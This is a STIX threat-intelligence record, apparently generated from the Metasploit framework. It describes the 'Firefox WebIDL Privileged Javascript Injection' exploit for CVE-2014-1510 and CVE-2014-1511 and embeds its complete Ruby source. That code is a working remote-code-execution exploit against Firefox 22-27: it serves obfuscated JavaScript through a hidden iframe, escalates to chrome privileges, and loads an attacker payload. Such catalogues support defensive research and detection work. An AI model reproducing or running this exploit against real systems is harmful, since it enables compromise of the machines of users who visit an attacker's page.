{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd4fcbe5-bbfc-4b3e-8990-ad1dcc202517",
    "created": "2024-08-14T17:05:43.869289Z",
    "modified": "2024-08-14T17:05:43.869293Z",
    "name": "Firefox WebIDL Privileged Javascript Injection",
    "description": " This exploit gains remote code execution on Firefox 22-27 by abusing two separate privilege escalation vulnerabilities in Firefox's Javascript APIs.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_webidl_injection.rb",
            "external_id": "firefox_webidl_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1511#bypasspopupblockertoloadbareChromeWindow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/exploitation/jsobfu'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::BrowserAutopwn\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  autopwn_info({\n    :ua_name    => HttpClients::FF,\n    :ua_minver  => \"22.0\",\n    :ua_maxver  => \"27.0\",\n    :javascript => true,\n    :rank       => ExcellentRanking\n  })\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox WebIDL Privileged Javascript Injection',\n      'Description'    => %q{\n        This exploit gains remote code execution on Firefox 22-27 by abusing two\n        separate privilege escalation vulnerabilities in Firefox's Javascript\n        APIs.\n      },\n      'License' => MSF_LICENSE,\n      'Author'  => [\n        'Marius Mlynski', # discovery and pwn2own exploit\n        'joev' # metasploit module\n      ],\n      'DisclosureDate' => '2014-03-17',\n      'References' => [\n        ['CVE', '2014-1510'], # open chrome:// url in iframe\n        ['CVE', '2014-1511']  # bypass popup blocker to load bare ChromeWindow\n      ],\n      'Targets' => [\n        [\n          'Universal (Javascript XPCOM Shell)', {\n            'Platform' => 'firefox',\n            'Arch' => ARCH_FIREFOX\n          }\n        ],\n        [\n          'Native Payload', {\n            'Platform' => %w{ java linux osx solaris win },\n            'Arch'     => ARCH_ALL\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::FF,\n        :ua_ver  => lambda { |ver| ver.to_i.between?(22, 27) }\n      }\n    ))\n\n    register_options([\n      OptString.new('CONTENT', [ false, \"Content to display inside the HTML <body>.\", \"\" ])\n    ])\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    send_response_html(cli, generate_html(target_info))\n  end\n\n  def generate_html(target_info)\n    key = Rex::Text.rand_text_alpha(5 + rand(12))\n    frame = Rex::Text.rand_text_alpha(5 + rand(12))\n    r = Rex::Text.rand_text_alpha(5 + rand(12))\n    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin\n    data_uri = \"data:text/html,<script>c = new mozRTCPeerConnection;c.createOffer(function()\"+\n               \"{},function(){top.vvv=window.open('chrome://browser/content/browser.xul', \"+\n               \"'#{r}', 'chrome,top=-9999px,left=-9999px,height=100px,width=100px');})<\\/script>\"\n\n    js = js_obfuscate %Q|\n      var opts = #{JSON.unparse(opts)};\n      var key = opts['#{key}'];\n\n      // Load the chrome-privileged browser XUL script into an iframe\n      var c = new mozRTCPeerConnection;\n      c.createOffer(function(){},function(){\n        window.open('chrome://browser/content/browser.xul', '#{frame}');\n        step1();\n      });\n\n      // Inject a data: URI into an internal frame inside of the browser\n      // XUL script to pop open a new window with the chrome flag to prevent\n      // the new window from being wrapped with browser XUL;\n      function step1() {\n        var clear = setInterval(function(){\n\n          // throws until frames[0].frames[2] is available (when chrome:// iframe loads)\n          frames[0].frames[2].location;\n\n          // we base64 this to avoid the script tag screwing up things when obfuscated\n          frames[0].frames[2].location=window.atob('#{Rex::Text.encode_base64(data_uri)}');\n          clearInterval(clear);\n          setTimeout(step2, 100);\n        },10);\n      }\n\n      // Step 2: load the chrome-level window up with a data URI, which\n      // gives us same-origin. Make sure to load an \"<iframe mozBrowser>\"\n      // into the frame, since that will respond to our messageManager\n      // (this is important later)\n      function step2() {\n        var clear = setInterval(function(){\n          top.vvv.location = 'data:text/html,<html><body><iframe mozBrowser '+\n                             'src=\"about:blank\"></iframe></body></html>';\n          clearInterval(clear);\n          setTimeout(step3, 100);\n        }, 10);\n      }\n\n      function step3() {\n        var clear = setInterval(function(){\n          if (!frames[0]) return; // will throw until the frame is accessible\n          top.vvv.messageManager.loadFrameScript('data:,'+key, false);\n          clearInterval(clear);\n          setTimeout(function(){top.vvv.close();}, 100);\n        }, 10);\n      }\n    |\n\n    %Q|\n      <!doctype html>\n      <html>\n        <body>\n          <iframe id='#{frame}' name='#{frame}'\n                  style='position:absolute;left:-9999999px;height:1px;width:1px;'>\n          </iframe>\n          <script>\n            #{js}\n          </script>\n          #{datastore['CONTENT']}\n        </body>\n      </html>\n    |\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-03-17",
    "x_mitre_platforms": [
        "%w{ java linux osx solaris win }"
    ]
}